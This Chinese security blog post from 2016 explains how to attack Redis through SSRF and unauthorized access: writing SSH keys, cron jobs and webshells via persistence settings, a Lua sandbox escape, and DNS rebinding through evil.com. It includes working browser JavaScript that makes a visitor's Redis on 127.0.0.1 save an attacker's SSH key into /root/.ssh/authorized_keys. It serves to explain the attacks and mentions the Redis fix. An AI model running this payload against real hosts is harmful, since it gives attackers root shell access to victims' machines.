---
id: 751
layout: post
title: 'Redis和SSRF'
date: 2016-07-20 17:57:00
author: virusdefender
tags: 安全
---

> 你以为bind了127.0.0.1就安全了么？

## 本地写文件

这个爆出来很久了。原理就是利用Redis的数据持久化。设置持久化文件的名称和路径，然后在Redis中写入文件内容，给Redis发送持久化的命令，这样Redis就会将数据库的内容写入执行的文件了。详细参考 http://blog.nsfocus.net/redis-unauthorized-ssh-free-password-vulnerabilities-fixes/

这个并不一定需要SSRF，如果Redis未授权访问的，那同样可以利用。

利用点

 - 写`$Home/.ssh/authorized_keys`，root用户就是`/root`，其他用户需要猜测或者遍历用户名。
 - 写`/var/spool/cron`，然后crontab定期执行，因为Redis持久化的数据可能包含其他的数据，所以写入的文件可能有一些垃圾信息，但是crontab对格式要求比较松，避免先去`flushall ` Redis。
 - 写webshell，但是得已知路径
 - slave of `$IP` 主从模式利用
 - 写`/etc/profile.d/`用户环境变量
 - AOF类型持久化，和RDB持久化类似，但是是纯文本的格式

## Redis中数据和web应用的结合

如果控制了Redis中的数据，很多时候和直接控制了数据库是一样的，可以有针对性的修改数据。参考 https://www.seebug.org/vuldb/ssvid-91879  在Redis中更改了全局变量的值，导致任意代码执行。里面有对gopher协议的利用，参考 https://blog.chaitin.com/gopher-attack-surfaces/

## Redis Lua Sandbox Escape

详情见 http://benmmurphy.github.io/blog/2015/06/04/redis-eval-lua-sandbox-escape/

利用了Redis的Lua支持，但是Redis的Lua是有sandbox的，不能执行任意的代码，怎么去尝试绕过？

https://gist.github.com/corsix/6575486 实现的了三个功能

 - 读取`TValue`结构体中的值
 - 读取任意内存地址上的8个字节，可以导致基地址泄露
 - 任意内存地址写8个字节

作者在多个系统和多个Redis上都测试通过，Redis已经修复这个问题 https://groups.google.com/forum/#!msg/redis-db/4Y6OqK8gEyk/Dg-5cejl-eUJ

## SSRF和CSRF结合体 看网页也能被拿shell

今天看到老外发了一个脑洞，https://ericrafaloff.com/client-side-redis-attack-poc/ 使用ajax直接给Redis发送请求，也利用的是Redis的Lua支持，原文中的Demo被我修改为写入ssh公钥的，当然上面提到的其他攻击方法都可以使用。

```js
var keydir = "/root/.ssh";
var cmd = new XMLHttpRequest();
cmd.open("POST", "http://127.0.0.1:6379");
cmd.send('eval \'' + 'redis.call(\"set\", \"hacked\", "\\r\\n\\nssh-rsa AAAAB... virusdefender@LiYangs-MacBook-Pro.local\\n\\n\\n\\n\"); redis.call(\"config\", \"set\", \"dir\", \"' + keydir + '/\"); redis.call(\"config\", \"set\", \"dbfilename\", \"authorized_keys\"); ' + '\' 0' + "\r\n");

var cmd = new XMLHttpRequest();
cmd.open("POST", "http://127.0.0.1:6379");
cmd.send('save\r\n');
```

在这里有一个最大的限制就是浏览器跨域请求的问题，根据 https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS 
 简单请求是可以直接跨域发送的，但是无法收到响应，简单请求的定义如下
 
>  只使用 GET, HEAD 或者 POST 请求方法。如果使用 POST 向服务器端传送数据，则数据类型(Content-Type)只能是 application/x-www-form-urlencoded, multipart/form-data 或 text/plain中的一种。

这里符合条件，所以可以直接发送请求到Redis端口。当然，还可以利用DNS Rebinding来绕过同源策略。步骤如下

 - 解析`evil.com`到正常ip，使用比较小的TTL
 - 用户浏览页面，页面中setTimeout到100秒后发送一个ajax请求到`evil.com`
 - 解析`evil.com`到`127.0.0.1`，因为TTL很小，所以生效很快，而且浏览器也会重新发送DNS查询
 - 100秒后，请求实际被发送到了`127.0.0.1`

## 思考
 - 还有那些服务像Redis一样是很好利用？
 - http://www.freebuf.com/articles/web/19622.html 还有哪些跨协议攻击？

## Update

后续 redis 3.2.6 版本加强了判断，将 Host 和 Post 两个单词当做了结束指令。



